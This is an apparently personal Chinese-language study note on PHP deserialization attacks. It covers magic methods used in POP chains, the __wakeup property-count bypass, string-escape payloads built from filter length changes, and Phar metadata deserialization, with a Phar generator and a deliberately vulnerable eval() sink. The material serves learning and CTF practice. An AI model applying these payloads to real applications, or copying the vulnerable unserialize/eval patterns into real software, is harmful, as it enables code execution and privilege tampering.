---
title: "PHP反序列化"
date: 2025-05-22
tags:
  - 基础漏洞
categories:
  - 安全相关
---
序列化：对象转换为字节流（数组或字符串等格式）；方便对象在内存、文件、数据或网络之间传递；

反序列化：将数组或字符串转换为对象；

## 反序列化的基本过程

```php
<?php
// 定义类
class Girl{
	// 声明属性
	public $name = '小红';
	public $age = 18;
	// 声明方法
	public function __construct($name, $age){
		$this->name = $name;
		$this->age = $age;
	}
	public function hello(){
		echo "Hello, my boy! \n";
		echo "My name is $this->name, my age is $this->age !";
	}
}

// 类实例化成为对象
$ryan = new Girl('小美', '18');
$str = serialize($ryan);	# 序列化
echo $str;	# 'O:4:"Girl":2:{s:4:"name";s:6:"小美";s:3:"age";s:2:"18";}';

$str = 'O:4:"Girl":2:{s:4:"name";s:6:"小美";s:3:"age";s:2:"18";}';
$object = unserialize($str); // 反序列化，还原为 Girl 对象（上面已经new了该对象，则反序列化会自动new该对象）
$object->hello(); // 对象调用方法
# My name is 小美, my age is 18 !
?>
```

![[attachments/20250523.png]]

## 常见触发条件

PHP 中常见的魔术方法：

```php
__call() 		// 调用不可访问或不存在的方法时被调用
__callStatic() 	// 调用不可访问或不存在的静态方法时被调用
__clone() 		// 进行对象的clone时被调用，用来调整对象的克隆行为
__construct() 	// 对象创建 (new) 时会自动调用
__destruct() 	// 对象被销毁时触发
__debuginfo		// 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本
__get() 		// 读取不可访问或不存在属性时被调用
__set() 		// 当给不可访问或不存在属性赋值时被调用
__invoke() 		// 当以函数方式调用对象时被调用
__isset() 		// 对不可访问或不存在的属性调用isset()或empty()时被调用
__set_state		// 当调用var_export()导出类时，此静态方法被调用；用__set_state的返回值作为var_export的返回值
__sleep() 		// 使用 serialize 时被调用
__toString() 	// 当一个类被转换成字符串时被调用
__unset() 		// 对不可访问或不存在的属性进行unset时被调用
__wakeup() 		// 使用 unserialize 时触发
__autoload() 	// 尝试加载未定义的类时被调用
```

反序列化常见起点：

```php
__wakeup		// 一定会调用
__destruct		// 一定会调用
__toString		// 当一个对象被反序列化后又当做字符串使用
```

反序列化常跳板：

```php
__get() 		// 读取不可访问或不存在属性时被调用
__set() 		// 当给不可访问或不存在属性赋值时被调用
__isset() 		// 对不可访问或不存在的属性调用isset()或empty()时被调用
__toString() 	// 当一个类被转换成字符串时被调用
```

反序列化常见终点：

```php
__call() 				// 调用不可访问或不存在的方法时被调用
call_user_func			// 一般php代码执行都会选择这里
call_user_func_array	// 一般php代码执行都会选择这里
```

成因：未对用户输入的序列化字符串进行检测，可控反序列化过程，导致代码执行、SQL 注入、目录遍历等；在反序列化的过程中自动触发的某些魔术方法；

### 通常所需要的利用条件

1. 有触发魔术方法；
2. 魔术方法有利用类；
3. 部分自带类拓展开启；（PHP 版本和配置文件）

## 基本步骤

> 生成步骤：
> 
> 1. 把题目代码复制到本地;
> 2. 注释掉与属性无关的内容（方法和没用的代码）；
> 3. 对属性赋值；
> 	- 直接对属性赋值（只能赋值字符串）；
> 	- 外部赋值（new 完对象后通过对象属性赋值）但只能操作 public 属性；
> 	- 构造方法赋值（eg：在类里的`__construct`类中对属性赋值）
> 4. 输出 url 编码后的序列化数据：`echo(urlencode(serialize(new DEMO())));`
> 5. 将序列化数据发送到目标服务器

POP链：POP（面向属性编程）链是指从现有运行环境中寻找一系列的代码或指令调用，然后根据需求构造出一组连续的调用链。

反序列化利用就是要找到合适的 POP 链。其实就是构造一条符合原代码需求的链条，去找到可以控制的属性或方法，从而构造 POP 链达到攻击的目的。

> 寻找 POP 链的思路：
> 
> 1. 寻找 unserialize() 函数的参数是否可控；
> 2. 寻找反序列化想要执行的目标函数，重点寻找魔术方法（比如 `__wakeup()` 和 `__destruct()` ）；
> 3. 一层一层地研究目标在魔术方法中使用的属性和调用的方法，看看其中是否有我们可控的属性和方法；
> 4. 根据我们要控制的属性，构造序列化数据，发起攻击

## 利用原生类

（*初步了解，后续需补充学习完整*）

> 原生自带类导致的 PHP 反序列化漏洞：
> 
> https://xz.aliyun.com/news/8792
> 
> https://www.anquanke.com/post/id/264823
> 
> https://blog.csdn.net/cjdgg/article/details/115314651
> 
> https://drun1baby.top/2023/04/11/PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/

## 部分绕过方式

### 绕过 `__wakeup`

适用版本：`php5.0.0 ~ php5.6.25、php7.0.0 ~ php7.0.10`；

由于`unserialize()`后会立即触发`__wakeup`，可通过修改属性数量的方式来绕过；

```txt
// 标准序列化数据
O:4:"Girl":2:{s:4:"name";s:6:"小美";s:3:"age";s:2:"18";}
// 绕过
// 修改对象属性数量，将原数量+n
O:4:"Girl":3:{s:4:"name";s:6:"小美";s:3:"age";s:2:"18";}
// 增加真实属性的个数
O:4:"Girl":2:{s:4:"name";s:6:"小美";s:3:"age";s:2:"18";s:1:"n":N;}
```

### 快速`__destruct`

PHP 接收到上面所提到的修改后的不正确的序列化字符串，其可以正常的反序列化，但是由于其不正确性，PHP 会直接触发 `__destruct`；

某些情况需要利用`__destruct`来获取 flag ，但其方法执行过于靠后，可能导致在 POC 其之前就会被过滤，此时就需要通过上述修改为不正确字符串来触发；

### 访问修饰符问题

版本 PHP 7.1+

反序列化对属性类型不敏感，有的属性不是 public ，但是在本地构造时可以改成 public 。

protected 修饰的属性，序列化时，字段名前会加上`\00*\00`的前缀；（这里的 `\00` 表示 ASCII 码为 0 的字符，属于不可见字符，因此该字段的长度会比可见字符长度大3。）

private 修饰的属性，序列化时，字段名前会加上`\00<declared class name>\00`前缀；（这里的`<declared class name`表示是声明该私有字段的类的类名，而不是被序列化的对象的类名。）

```php
<?php
class Girl{
	public $name = '小红';
	protected $age = 18;
	private $money = 100.5;
	public function __construct($name ,$age, $money){
		$this->name = $name;
		$this->age = $age;
		$this->money = $money;
	}
	public function hello(){
		echo "My name is $this->name, my age is $this->age !";
		echo "I have $this->money RMB!";
	}
}
$str = 'O:4:"Girl":3:{s:4:"name";s:4:"Ryan";S:6:"\00*\00age";i:20;S:11:"\00Girl\00money";d:108.5;}';
$object = unserialize($str);
$object->hello();
?>

# My name is Ryan,my age is 20!I have 108.5 RMB!
```

### 字符串逃逸

> 学习原文： https://www.cnblogs.com/hetianlab/p/15180673.html

> 当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。此时有可能产生 PHP 反序列化字符逃逸的漏洞。

两种情况：过滤后字符变多/变少；

#### 示例（变多）

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;
    
    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}
​
function filter($s){
    return str_replace("admin","hacker",$s);
}	# 将admin 替换为 hacker
​
$a = new user("admin","123456");
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri;​
echo $a_seri_filter;
?>
```

```txt
O:4:"user":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}

O:4:"user":3:{s:8:"username";s:5:"hacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

现在期望的是使 isVIP 的值为 1 ；

```txt
";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}	// 现有子串
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}	// 目标子串
```

需要再 admin 可控参数处注入目标子串，目标子串长度为 47 ，admin 每变为一次 hacker 会多 1 个字符；

所以这里重复 47 遍 admin ，然后加上逃逸的目标子串，可控变量修改为：

```php
$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}','123456');	# 替换第一个参数
```

此时的输出结果会变为：

```txt
O:4:"user":3:{s:8:"username";s:282:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
// username刚好282个字符
```

> **反序列化后，多余的子串会被抛弃**

```php
# 接上面代码~
unserialize($a_seri_filter); 
var_dump($a_seri_filter_unseri);
```

输出：

```txt
object(user)#2 (3) {
  ["username"]=>
  string(282) "hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker"
  ["password"]=>
  string(6) "123456"
  ["isVIP"]=>
  int(1)
} # 成功输出
```

#### 示例（变少）

```php
function filter($s){ 
	return str_replace("admin","hack",$s); 
}
```

目标子串 47 位，需计算下一个可控变量的字符串长度：

```txt
";s:8:"password";s:6:"
//长度为22
```

每次过滤会减少 1 个字符；这里用了 23 个 admin 具体数量需要通过计算测试自己构造；

```php
# 接上面的代码~
$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}'); # 替换第一个参数和第二个参数
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;

$a_seri_filter_unseri = unserialize($a_seri_filter); var_dump($a_seri_filter_unseri);
```

成功得到结果：

```txt
O:4:"user":3:{s:8:"username";s:115:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:"";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}

object(user)#2 (3) {
  ["username"]=>
  string(115) "hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:""
  ["password"]=>
  string(6) "123456"
  ["isVIP"]=>
  int(1)
}
```

主要还是要构造 Payload 来达到注入使序列化后的字符传正常闭合，挤掉后面原本不需要的字符串。

## Phar 反序列化

PHP 5.3 开始，引入类似于 JAR 的一种打包文件机制。它可以将多个文件存放在同一个文件中，无需解压，PHP 就可以进行访问并执行内部语句。

Phar 文件结构

```txt
Stub		//Phar文件头
manifest	//压缩文件信息
contents	//压缩文件内容
signature	//签名
```

原理：Phar 文件会以序列化的形式存储用户自定义的 元数据（Meta-data），PHP 使用`phar_parse_metadata`在解析 meta 数据时，会调用`php_var_unserialize`进行反序列化操作；

Phar属于伪协议，伪协议使用较多的是一些文件操作函数，如`fopen()`、`copy()`、`file_exists()`等，具体如下图，也就是下面的函数如果参数可控可以造成 Phar 反序列化，所以当这些函数接收到伪协议处理到 phar 文件的时候，Meta-data 里的序列化字符串就会被反序列化，实现不使用 `unserialize()` 函数实现反序列化操作。

![[attachments/20250525.png]]

利用条件：

1. phar 文件（任意后缀都可以）能上传至服务器；
2. 存在受影响函数，存在可以利用的魔术方法；
3. 文件操作函数的参数可控。

> 生成 Phar 注意：php.ini 中将 phar.readonly 设置为 off

```php
<?php  
class Demo{  
    public $name="qwq";  
    function __destruct()  
    {  
        echo $this->name;  
    }  
}  
$a = new Demo();  
$a->name="phpinfo();";  
  
// 创建一个新的 Phar 对象，指定生成的 Phar 文件名为 phar.phar，后缀名必须为phar  
$phartest=new phar('phartest.phar',0);  
//开始缓冲 Phar 写操作  
$phartest->startBuffering();  
//将自定义对象的meta-data存入manifest  
$phartest->setMetadata($a);  
//设置stub，Phar文件的标志，stub是一个简单的php文件，但其中必须包含__HALT_COMPILER();。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测  
$phartest->setStub("<?php __HALT_COMPILER();?>");  
//添加要压缩的文件demo.txt，内容为demo  
$phartest->addFromString("demo.txt","demo");  
//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘  
$phartest->stopBuffering();  
?>
```

运行生成 Phar 文件。

存在漏洞代码，通过 `file_get_contents` 触发 phar 反序列化：

```php
<?php  
class Demo{  
    public $name="";  
    public function __destruct()  
    {  
        eval($this->name);  
    }  
}  
$phardemo = file_get_contents('phar://phartest.phar/test.txt');  
echo $phardemo;
```

访问该文件，得到 `phpinfo()` 的回显。

> 案例：
> 
> https://mp.weixin.qq.com/s/2wzaXIpJgYSNnkJgRNUSEg
> 
> https://mp.weixin.qq.com/s/Z24A3LYn6P3276v7GqPw4w


